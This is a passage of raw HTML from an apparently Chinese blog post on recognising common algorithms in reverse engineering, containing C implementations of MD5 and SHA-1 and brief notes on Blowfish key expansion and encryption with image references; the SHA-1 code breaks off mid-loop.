class="hljs-comment">//第2轮循环变换</span><br>    GG (a, b, c, d, x[ <span class="hljs-number">1</span>], S21, <span class="hljs-number">0xf61e2562</span>); <span class="hljs-comment">/* 17 */</span><br>    GG (d, a, b, c, x[ <span class="hljs-number">6</span>], S22, <span class="hljs-number">0xc040b340</span>); <span class="hljs-comment">/* 18 */</span><br>    GG (c, d, a, b, x[<span class="hljs-number">11</span>], S23, <span class="hljs-number">0x265e5a51</span>); <span class="hljs-comment">/* 19 */</span><br>    GG (b, c, d, a, x[ <span class="hljs-number">0</span>], S24, <span class="hljs-number">0xe9b6c7aa</span>); <span class="hljs-comment">/* 20 */</span><br>    GG (a, b, c, d, x[ <span class="hljs-number">5</span>], S21, <span class="hljs-number">0xd62f105d</span>); <span class="hljs-comment">/* 21 */</span><br>    GG (d, a, b, c, x[<span class="hljs-number">10</span>], S22,  <span class="hljs-number">0x2441453</span>); <span class="hljs-comment">/* 22 */</span><br>    GG (c, d, a, b, x[<span class="hljs-number">15</span>], S23, <span class="hljs-number">0xd8a1e681</span>); <span class="hljs-comment">/* 23 */</span><br>    GG (b, c, d, a, x[ <span class="hljs-number">4</span>], S24, <span class="hljs-number">0xe7d3fbc8</span>); <span class="hljs-comment">/* 24 */</span><br>    GG (a, b, c, d, x[ <span class="hljs-number">9</span>], S21, <span class="hljs-number">0x21e1cde6</span>); <span class="hljs-comment">/* 25 */</span><br>    GG (d, a, b, c, x[<span class="hljs-number">14</span>], S22, <span class="hljs-number">0xc33707d6</span>); <span class="hljs-comment">/* 26 */</span><br>    GG (c, d, a, b, x[ <span class="hljs-number">3</span>], S23, <span class="hljs-number">0xf4d50d87</span>); <span class="hljs-comment">/* 27 */</span><br>    GG (b, c, d, a, x[ <span class="hljs-number">8</span>], S24, <span class="hljs-number">0x455a14ed</span>); <span class="hljs-comment">/* 28 */</span><br>    GG (a, b, c, d, x[<span class="hljs-number">13</span>], S21, <span class="hljs-number">0xa9e3e905</span>); <span class="hljs-comment">/* 29 */</span><br>    GG (d, a, b, c, x[ <span class="hljs-number">2</span>], S22, <span class="hljs-number">0xfcefa3f8</span>); <span class="hljs-comment">/* 30 */</span><br>    GG (c, d, a, b, x[ <span class="hljs-number">7</span>], S23, <span class="hljs-number">0x676f02d9</span>); <span class="hljs-comment">/* 31 */</span><br>    GG (b, c, d, a, x[<span class="hljs-number">12</span>], S24, <span class="hljs-number">0x8d2a4c8a</span>); <span class="hljs-comment">/* 32 */</span><br>    <span class="hljs-comment">//第3轮循环变换</span><br>    HH (a, b, c, d, x[ <span class="hljs-number">5</span>], S31, <span class="hljs-number">0xfffa3942</span>); <span class="hljs-comment">/* 33 */</span><br>    HH (d, a, b, c, x[ <span class="hljs-number">8</span>], S32, <span class="hljs-number">0x8771f681</span>); <span class="hljs-comment">/* 34 */</span><br>    HH (c, d, a, b, x[<span class="hljs-number">11</span>], S33, <span class="hljs-number">0x6d9d6122</span>); <span class="hljs-comment">/* 35 */</span><br>    HH (b, c, d, a, x[<span class="hljs-number">14</span>], S34, <span class="hljs-number">0xfde5380c</span>); <span class="hljs-comment">/* 36 */</span><br>    HH (a, b, c, d, x[ <span class="hljs-number">1</span>], S31, <span class="hljs-number">0xa4beea44</span>); <span class="hljs-comment">/* 37 */</span><br>    HH (d, a, b, c, x[ <span class="hljs-number">4</span>], S32, <span class="hljs-number">0x4bdecfa9</span>); <span class="hljs-comment">/* 38 */</span><br>    HH (c, d, a, b, x[ <span class="hljs-number">7</span>], S33, <span class="hljs-number">0xf6bb4b60</span>); <span class="hljs-comment">/* 39 */</span><br>    HH (b, c, d, a, x[<span class="hljs-number">10</span>], S34, <span class="hljs-number">0xbebfbc70</span>); <span class="hljs-comment">/* 40 */</span><br>    HH (a, b, c, d, x[<span class="hljs-number">13</span>], S31, <span class="hljs-number">0x289b7ec6</span>); <span class="hljs-comment">/* 41 */</span><br>    HH (d, a, b, c, x[ <span class="hljs-number">0</span>], S32, <span class="hljs-number">0xeaa127fa</span>); <span class="hljs-comment">/* 42 */</span><br>    HH (c, d, a, b, x[ <span class="hljs-number">3</span>], S33, <span class="hljs-number">0xd4ef3085</span>); <span class="hljs-comment">/* 43 */</span><br>    HH (b, c, d, a, x[ <span class="hljs-number">6</span>], S34,  <span class="hljs-number">0x4881d05</span>); <span class="hljs-comment">/* 44 */</span><br>    HH (a, b, c, d, x[ <span class="hljs-number">9</span>], S31, <span class="hljs-number">0xd9d4d039</span>); <span class="hljs-comment">/* 45 */</span><br>    HH (d, a, b, c, x[<span class="hljs-number">12</span>], S32, <span class="hljs-number">0xe6db99e5</span>); <span class="hljs-comment">/* 46 */</span><br>    HH (c, d, a, b, x[<span class="hljs-number">15</span>], S33, <span class="hljs-number">0x1fa27cf8</span>); <span class="hljs-comment">/* 47 */</span><br>    HH (b, c, d, a, x[ <span class="hljs-number">2</span>], S34, <span class="hljs-number">0xc4ac5665</span>); <span class="hljs-comment">/* 48 */</span><br>    <span class="hljs-comment">//第4轮循环变换</span><br>    II (a, b, c, d, x[ <span class="hljs-number">0</span>], S41, <span class="hljs-number">0xf4292244</span>); <span class="hljs-comment">/* 49 */</span><br>    II (d, a, b, c, x[ <span class="hljs-number">7</span>], S42, <span class="hljs-number">0x432aff97</span>); <span class="hljs-comment">/* 50 */</span><br>    II (c, d, a, b, x[<span class="hljs-number">14</span>], S43, <span class="hljs-number">0xab9423a7</span>); <span class="hljs-comment">/* 51 */</span><br>    II (b, c, d, a, x[ <span class="hljs-number">5</span>], S44, <span class="hljs-number">0xfc93a039</span>); <span class="hljs-comment">/* 52 */</span><br>    II (a, b, c, d, x[<span class="hljs-number">12</span>], S41, <span class="hljs-number">0x655b59c3</span>); <span class="hljs-comment">/* 53 */</span><br>    II (d, a, b, c, x[ <span class="hljs-number">3</span>], S42, <span class="hljs-number">0x8f0ccc92</span>); <span class="hljs-comment">/* 54 */</span><br>    II (c, d, a, b, x[<span class="hljs-number">10</span>], S43, <span class="hljs-number">0xffeff47d</span>); <span class="hljs-comment">/* 55 */</span><br>    II (b, c, d, a, x[ <span class="hljs-number">1</span>], S44, <span class="hljs-number">0x85845dd1</span>); <span class="hljs-comment">/* 56 */</span><br>    II (a, b, c, d, x[ <span class="hljs-number">8</span>], S41, <span class="hljs-number">0x6fa87e4f</span>); <span class="hljs-comment">/* 57 */</span><br>    II (d, a, b, c, x[<span class="hljs-number">15</span>], S42, <span class="hljs-number">0xfe2ce6e0</span>); <span class="hljs-comment">/* 58 */</span><br>    II (c, d, a, b, x[ <span class="hljs-number">6</span>], S43, <span class="hljs-number">0xa3014314</span>); <span class="hljs-comment">/* 59 */</span><br>    II (b, c, d, a, x[<span class="hljs-number">13</span>], S44, <span class="hljs-number">0x4e0811a1</span>); <span class="hljs-comment">/* 60 */</span><br>    II (a, b, c, d, x[ <span class="hljs-number">4</span>], S41, <span class="hljs-number">0xf7537e82</span>); <span class="hljs-comment">/* 61 */</span><br>    II (d, a, b, c, x[<span class="hljs-number">11</span>], S42, <span class="hljs-number">0xbd3af235</span>); <span class="hljs-comment">/* 62 */</span><br>    II (c, d, a, b, x[ <span class="hljs-number">2</span>], S43, <span class="hljs-number">0x2ad7d2bb</span>); <span class="hljs-comment">/* 63 */</span><br>    II (b, c, d, a, x[ <span class="hljs-number">9</span>], S44, <span class="hljs-number">0xeb86d391</span>); <span class="hljs-comment">/* 64 */</span><br><br>    state[<span class="hljs-number">0</span>] += a;<br>    state[<span class="hljs-number">1</span>] += b;<br>    state[<span class="hljs-number">2</span>] += c;<br>    state[<span class="hljs-number">3</span>] += d;<br>&#125;<br><br><span class="hljs-comment">//将无符号整数转为字节类型数组</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Encode</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *output, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, j;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; j &lt; len; i++, j += <span class="hljs-number">4</span>) &#123;<br>        output[j] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)(input[i] &amp; <span class="hljs-number">0xff</span>);<br>        output[j+<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((input[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>);<br>        output[j+<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((input[i] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>);<br>        output[j+<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((input[i] &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//将字节类型数组转为无符号整数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Decode</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *output, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, j;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; j &lt; len; i++, j += <span class="hljs-number">4</span>)<br>        output[i] = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input[j]) | (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input[j+<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) |<br>        (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input[j+<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input[j+<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    MD5_CTX md5_calc;<br>    <span class="hljs-type">char</span> c[]=<span class="hljs-string">&quot;abc&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> md5[<span class="hljs-number">16</span>];<br>    <span class="hljs-comment">//演示计算字符串abc的MD5码</span><br>    MD5Init(&amp;md5_calc);<br>    MD5Update(&amp;md5_calc,(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)c,<span class="hljs-built_in">strlen</span>(c));<br>    MD5Final(md5,&amp;md5_calc);<br>    <span class="hljs-comment">//输出MD5码</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;字符串abc的MD5码为：&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x&quot;</span>,md5[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="BlowFish"><a href="#BlowFish" class="headerlink" title="BlowFish"></a><strong>BlowFish</strong></h1><p>是对称加密，是用来替代DES算法出现的，是 将一个数 拆分为 左右各32位然后 左边进行 ^ key_pbox 当作下一次循环的右边。右边 则是 右边 ^ F(左边)下次当作循环的左边</p><p>常量</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1703390912245-342578b0-719a-48dd-ab02-f0418c5681f1.png" class="" title="img"><p>常见的前几位PBox</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562401045-5cda2e71-7c6a-4a65-b23c-cc5109d80cc9.png" class="" title="img"><h2 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h2><p><strong>循环轮数先是18，后是256</strong></p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562611018-1bd9f689-6e46-495d-8073-b22fa1ec241c.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562932304-1d1a2e44-0130-42e3-91f5-d3955ad66aaa.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562785506-05ec6741-6080-4994-b558-4e94c3ff83a7.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700562801014-54976159-044a-4f28-9e8d-97e10aad8bf9.png" class="" title="img"><h2 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h2><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700563149721-eaae8489-5f37-4634-8fab-96d0ac2e4308.png" class="" title="img"><p>16轮循环，里面有交换操作</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1700563125986-2126e3dd-4636-4c80-90ae-8e3f636ca6aa.png" class="" title="img"><h1 id="sha1"><a href="#sha1" class="headerlink" title="sha1"></a>sha1</h1><p>主循环4轮，每轮20次操作 </p><p>有两组常量，分别对应k数组和MD buffer</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1707097836461-8a93cae5-dc75-44f6-8fe6-886db0e0db5b.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1714110661316-4c4b6b35-4fe4-40d9-95b9-2f7235ce7517.jpeg" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1714110671642-2aee3dba-bad9-4b34-bad4-6475cf53cd63.jpeg" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br> <br><span class="hljs-comment">#define HASH_BLOCK_SIZE         64  /* 512 bits = 64 bytes */</span><br><span class="hljs-comment">#define HASH_LEN_SIZE           8   /* 64 bits =  8 bytes */</span><br><span class="hljs-comment">#define HASH_LEN_OFFSET         56  /* 64 bytes - 8 bytes */</span><br><span class="hljs-comment">#define HASH_DIGEST_SIZE        16  /* 128 bits = 16 bytes */</span><br><span class="hljs-comment">#define HASH_ROUND_NUM          80 </span><br> <br>typedef unsigned char       uint8_t;<br>typedef unsigned short <span class="hljs-built_in">int</span>  uint16_t;<br>typedef unsigned <span class="hljs-built_in">int</span>        uint32_t;<br>typedef unsigned long long  uint64_t;<br> <br>/* Swap <span class="hljs-built_in">bytes</span> <span class="hljs-keyword">in</span> <span class="hljs-number">32</span> bit value. <span class="hljs-number">0x01234567</span> -&gt; <span class="hljs-number">0x67452301</span> */<br><span class="hljs-comment">#define __bswap_32(x)    \</span><br>     ((((x) &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span>)  \<br>     | (((x) &amp; <span class="hljs-number">0x00ff0000</span>) &gt;&gt;  <span class="hljs-number">8</span>) \<br>     | (((x) &amp; <span class="hljs-number">0x0000ff00</span>) &lt;&lt;  <span class="hljs-number">8</span>) \<br>     | (((x) &amp; <span class="hljs-number">0x000000ff</span>) &lt;&lt; <span class="hljs-number">24</span>))<br> <br>/* SHA1 Constants */<br>static uint32_t K[<span class="hljs-number">4</span>] =<br>&#123;<br>    <span class="hljs-number">0x5A827999</span>,     /* [<span class="hljs-number">0</span>,  <span class="hljs-number">19</span>] */<br>    <span class="hljs-number">0x6ED9EBA1</span>,     /* [<span class="hljs-number">20</span>, <span class="hljs-number">39</span>] */<br>    <span class="hljs-number">0x8F1BBCDC</span>,     /* [<span class="hljs-number">40</span>, <span class="hljs-number">59</span>] */<br>    <span class="hljs-number">0xCA62C1D6</span>      /* [<span class="hljs-number">60</span>, <span class="hljs-number">79</span>] */<br>&#125;;<br> <br>/*                  f(X, Y, Z)                      */<br>/* [<span class="hljs-number">0</span>,  <span class="hljs-number">19</span>] */<br>static uint32_t Ch(uint32_t X, uint32_t Y, uint32_t Z)<br>&#123;<br>    <span class="hljs-keyword">return</span> (X &amp; Y) ^ ((~X) &amp; Z);<br>&#125;<br>/* [<span class="hljs-number">20</span>, <span class="hljs-number">39</span>] */  /* [<span class="hljs-number">60</span>, <span class="hljs-number">79</span>] */<br>static uint32_t Parity(uint32_t X, uint32_t Y, uint32_t Z)<br>&#123;<br>    <span class="hljs-keyword">return</span> X ^ Y ^ Z;<br>&#125;<br>/* [<span class="hljs-number">40</span>, <span class="hljs-number">59</span>] */<br>static uint32_t Maj(uint32_t X, uint32_t Y, uint32_t Z)<br>&#123;<br>    <span class="hljs-keyword">return</span> (X &amp; Y) ^ (X &amp; Z) ^ (Y &amp; Z);<br>&#125;<br> <br>/* 循环向左移动offset个比特位 */<br>static uint32_t MoveLeft(uint32_t X, uint8_t offset)<br>&#123;<br>    uint32_t res = (X &lt;&lt; offset) | (X &gt;&gt; (<span class="hljs-number">32</span> - offset));<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br> <br><span class="hljs-comment">#define ASSERT_RETURN_INT(x, d) if(!(x)) &#123; return d; &#125;</span><br> <br><span class="hljs-built_in">int</span> sha1(unsigned char *out, const unsigned char* <span class="hljs-keyword">in</span>, const <span class="hljs-built_in">int</span> inlen)<br>&#123;<br>    ASSERT_RETURN_INT(out &amp;&amp; <span class="hljs-keyword">in</span> &amp;&amp; (inlen &gt;= <span class="hljs-number">0</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br> <br>    // step <span class="hljs-number">1</span>: 字节填充(Append Padding Bytes)<br>    // 数据先补上<span class="hljs-number">1</span>个<span class="hljs-number">1</span>比特，再补上k个<span class="hljs-number">0</span>比特，使得补位后的数据比特数(n+<span class="hljs-number">1</span>+k)满足(n+<span class="hljs-number">1</span>+k) mod <span class="hljs-number">512</span> = <span class="hljs-number">448</span>，k取最小正整数<br>    <span class="hljs-built_in">int</span> iX = inlen / HASH_BLOCK_SIZE;<br>    <span class="hljs-built_in">int</span> iY = inlen % HASH_BLOCK_SIZE;<br>    iX = (iY &lt; HASH_LEN_OFFSET) ? iX : (iX + <span class="hljs-number">1</span>);<br> <br>    <span class="hljs-built_in">int</span> iLen = (iX + <span class="hljs-number">1</span>) * HASH_BLOCK_SIZE;<br>    unsigned char* X = malloc(iLen);<br>    memcpy(X, <span class="hljs-keyword">in</span>, inlen);<br>    // 先补上<span class="hljs-number">1</span>个<span class="hljs-number">1</span>比特+<span class="hljs-number">7</span>个<span class="hljs-number">0</span>比特<br>    X[inlen] = <span class="hljs-number">0x80</span>;<br>    // 再补上(k-<span class="hljs-number">7</span>)个<span class="hljs-number">0</span>比特<br>    <span class="hljs-keyword">for</span> (i = inlen + <span class="hljs-number">1</span>; i &lt; (iX * HASH_BLOCK_SIZE + HASH_LEN_OFFSET); i++)<br>    &#123;<br>        X[i] = <span class="hljs-number">0</span>;<br>    &#125;<br> <br>    // step <span class="hljs-number">2</span>: 追加长度信息(Append Length)<br>    uint8_t *pLen = (uint64_t*)(X + (iX * HASH_BLOCK_SIZE + HASH_LEN_OFFSET));<br>    uint64_t iTempLen = inlen &lt;&lt; <span class="hljs-number">3</span>;<br>    uint8_t *pTempLen = &amp;iTempLen;<br>    pLen[<span class="hljs-number">0</span>] = pTempLen[<span class="hljs-number">7</span>]; pLen[<span class="hljs-number">1</span>] = pTempLen[<span class="hljs-number">6</span>]; pLen[<span class="hljs-number">2</span>] = pTempLen[<span class="hljs-number">5</span>];  pLen[<span class="hljs-number">3</span>] = pTempLen[<span class="hljs-number">4</span>];<br>    pLen[<span class="hljs-number">4</span>] = pTempLen[<span class="hljs-number">3</span>]; pLen[<span class="hljs-number">5</span>] = pTempLen[<span class="hljs-number">2</span>]; pLen[<span class="hljs-number">6</span>] = pTempLen[<span class="hljs-number">1</span>];  pLen[<span class="hljs-number">7</span>] = pTempLen[<span class="hljs-number">0</span>];<br> <br>    // Step <span class="hljs-number">3.</span> 初始化MD Buffer(Initialize MD Buffer)<br>    uint32_t H0 = <span class="hljs-number">0x67452301</span>;   // <span class="hljs-number">0x01</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x67</span><br>    uint32_t H1 = <span class="hljs-number">0xEFCDAB89</span>;   // <span class="hljs-number">0x89</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEF</span><br>    uint32_t H2 = <span class="hljs-number">0x98BADCFE</span>;   // <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span><br>    uint32_t H3 = <span class="hljs-number">0x10325476</span>;   // <span class="hljs-number">0x76</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x10</span><br>    uint32_t H4 = <span class="hljs-number">0xC3D2E1F0</span>;   // <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xC3</span><br> <br>    uint32_t M[HASH_BLOCK_SIZE / <span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    uint32_t W[HASH_ROUND_NUM] = &#123; <span class="hljs-number">0</span> &#125;;<br> <br>    // step <span class="hljs-number">4</span>: 处理消息块(Process Message <span class="hljs-keyword">in</span> <span class="hljs-number">64</span>-Byte Blocks)<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; iLen / HASH_BLOCK_SIZE; i++)<br>    &#123;<br>        /* Copy block i into X. */<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; HASH_BLOCK_SIZE; j = j + <span class="hljs-number">4</span>)<br>        &#123;<br>            uint64_t k = i * HASH_BLOCK_SIZE + j;<br>            M[j / <span class="hljs-number">4</span>] = (X[k] &lt;&lt; <span class="hljs-number">24</span>) | (X[k + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (X[k + <span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | X[k + <span class="hljs-number">3</span>];<br>        &#125;<br> <br>        /*  a. Divide M(i) into <span class="hljs-number">16</span> words W(<span class="hljs-number">0</span>), W(<span class="hljs-number">1</span>), ..., W(<span class="hljs-number">15</span>), where W(<span class="hljs-number">0</span>) <span class="hljs-keyword">is</span> the left - most word. */<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">0</span>; t &lt;= <span class="hljs-number">15</span>; t++)<br>        &#123;<br>            W[t] = M[t];<br>        &#125;<br> <br>        /*  b. For t = <span class="hljs-number">16</span> to <span class="hljs-number">79</span> let<br>        W(t) = S^<span class="hljs-number">1</span>(W(t-<span class="hljs-number">3</span>) XOR W(t-<span class="hljs-number">8</span>) XOR W(t-<span class="hljs-number">14</span>) XOR W(t-<span class="hljs-number">16</span>)). */<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">16</span>; t &lt;= <span class="hljs-number">79</span>; t++)<br>        &#123;<br>            W[t] = MoveLeft(W[t - <span class="hljs-number">3</span>] ^ W[t - <span class="hljs-number">8</span>] ^ W[t - <span class="hljs-number">14</span>] ^ W[t - <span class="hljs-number">16</span>], <span class="hljs-number">1</span>);<br>        &#125;<br> <br>        /*  c. Let A = H0, B = H1, C = H2, D = H3, E = H4. */<br>        uint32_t A = H0;<br>        uint32_t B = H1;<br>        uint32_t C = H2;<br>        uint32_t D = H3;<br>        uint32_t E = H4;<br> <br>        /*  d. For t = <span class="hljs-number">0</span> to <span class="hljs-number">79</span> do<br>        TEMP = S^<span class="hljs-number">5</span>(A) + f(t;B,C,D) + E + W(t) + K(t);<br>        E = D;  D = C;  C = S^<span class="hljs-number">30</span>(B);  B = A; A = TEMP; */<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">0</span>; t &lt;= <span class="hljs-number">19</span>; t++)<br>        &#123;<br>            uint32_t temp = MoveLeft(A, <span class="hljs-number">5</span>) + Ch(B, C, D) + E + W[t] + K[<span class="hljs-number">0</span>];<br>            E = D;<br>            D = C;<br>            C = MoveLeft(B, <span class="hljs-number">30</span>);<br>            B = A;<br>            A = temp;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">20</span>; t &lt;= <span class="hljs-number">39</span>; t++)<br>        &#123;<br>            uint32_t temp = MoveLeft(A, <span class="hljs-number">5</span>) + Parity(B, C, D) + E + W[t] + K[<span class="hljs-number">1</span>];<br>            E = D;<br>            D = C;<br>            C = MoveLeft(B, <span class="hljs-number">30</span>);<br>            B = A;<br>            A = temp;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">40</span>; t &lt;= <span class="hljs-number">59</span>; t++)<br>        &#123;<br>        